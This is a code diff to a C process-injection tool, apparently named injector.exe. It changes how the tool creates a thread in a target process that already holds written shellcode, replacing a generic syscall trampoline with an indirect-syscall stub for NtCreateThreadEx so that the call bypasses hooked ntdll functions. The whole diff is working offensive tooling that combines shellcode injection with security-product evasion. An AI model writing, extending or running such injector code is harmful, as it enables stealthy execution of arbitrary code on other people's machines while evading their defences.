@@ -4,8 +4,9 @@
 /*
 Compile w/ gcc indirect_syscall.c indirect_trampoline_syscall.o -o injector.exe -lkernel32
 */
-
-extern "C" void* syscall_trampoline7(PBYTE syscallStub, DWORD syscallID, void* arg1, void* arg2, void* arg3, void* arg4, void* arg5, void* arg6, void* arg7);
+DWORD  g_SSN_NtCreateThreadEx   = 0;
+PVOID  g_Stub_NtCreateThreadEx  = 0;
+extern "C" NTSTATUS stubNtCreateThreadEx(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, void* ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE StartRoutine, void* Arguments, void* CreateFlags, void* ZeroBits, void* StackSize, void* MaximumStackSize, void* AttributeList);
 
 typedef struct _SYSCALL_STUB {
     DWORD SyscallId;
@@ -16,6 +17,7 @@ _SYSCALL_STUB getDirectSyscallStub(HMODULE hNTDLL, const char* NtFunctionName){
     SYSCALL_STUB stub = { 0 };
     PVOID NtFunctionAddr = (PVOID)GetProcAddress(hNTDLL, NtFunctionName);
     if (!NtFunctionAddr) return stub;
+    printf("[+] Function %s at %p\n", NtFunctionName, NtFunctionAddr);
 
     /*
     Au début de la fonction il y a : 
@@ -33,7 +35,7 @@ _SYSCALL_STUB getDirectSyscallStub(HMODULE hNTDLL, const char* NtFunctionName){
     DWORD syscallID = *(DWORD*)((BYTE*)NtFunctionAddr + 4);
     void* syscallAddress = (void*)((BYTE*)NtFunctionAddr + 0x12);
 
-    printf("[+] %s → SSN 0x%x @ 0x%p\n", NtFunctionName, syscallID, syscallAddress);
+    printf("\t[+] %s stub : SSN 0x%x @ 0x%p\n", NtFunctionName, syscallID, syscallAddress);
     
     stub.SyscallId = syscallID;
     stub.SyscallFunc = syscallAddress;
@@ -126,10 +128,15 @@ int injectProc(int PID){
     printf("[+] Shellcode %s written\n", is64 ? "64bit" : "32bit");
     
     _SYSCALL_STUB stub = getDirectSyscallStub(GetModuleHandle(TEXT("ntdll.dll")), "NtCreateThreadEx");
+    g_SSN_NtCreateThreadEx = stub.SyscallId;
+    g_Stub_NtCreateThreadEx = stub.SyscallFunc;
 
-    HANDLE hThread = (HANDLE)syscall_trampoline7((PBYTE)stub.SyscallFunc, stub.SyscallId, hProcess, NULL, 0, memPoolPtr, NULL, FALSE, NULL);
+    HANDLE  hThread  = NULL;
+    ACCESS_MASK acc  = THREAD_ALL_ACCESS;
+
+    stubNtCreateThreadEx( &hThread, 0x1FFFFF, NULL, hProcess, (LPTHREAD_START_ROUTINE)memPoolPtr, NULL, FALSE, NULL, NULL, NULL, NULL);
     if (hThread == NULL) {
-        printf("CreateRemoteThread failed : %ul\n", GetLastError());
+        printf("NtCreateThreadEx failed : %ul\n", GetLastError());
         return 1;
     }
     printf("[+] Remote thread created.\n");
